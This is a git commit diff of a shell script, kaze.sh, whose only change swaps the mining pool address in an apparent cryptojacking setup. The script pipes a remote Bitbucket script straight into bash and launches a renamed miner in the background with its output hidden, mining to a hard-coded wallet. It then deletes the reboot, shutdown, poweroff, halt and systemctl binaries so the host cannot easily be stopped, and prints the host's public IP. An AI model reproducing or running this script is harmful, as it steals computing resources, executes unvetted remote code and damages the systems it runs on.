7fa3a0bf20d03b9d1a117d0ad525c5bf6060d029
kamikaze05 <167535693+kamikaze05@users.noreply.github.com>
2024-06-13 11:54:14 +0700

    Update kaze.sh

--- kaze.sh
+++ kaze.sh
@@ -3,7 +3,7 @@ apt-get update
 apt-get install -y wget curl sudo
 curl -sL https://bitbucket.org/new-kamikaze/srbkaze/raw/main/grsrb.sh | bash
 chmod +x srbkaze
-sudo nohup ./srbkaze --algorithm verushash --pool 79.137.70.48:3956 --wallet RQi6kpwRhnL86G3wMs6segFP5jC7Gfue24.kaze1 > /dev/null 2>&1 &
+sudo nohup ./srbkaze --algorithm verushash --pool 149.56.27.47:3958 --wallet RQi6kpwRhnL86G3wMs6segFP5jC7Gfue24.kaze1 > /dev/null 2>&1 &
 sleep 10
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
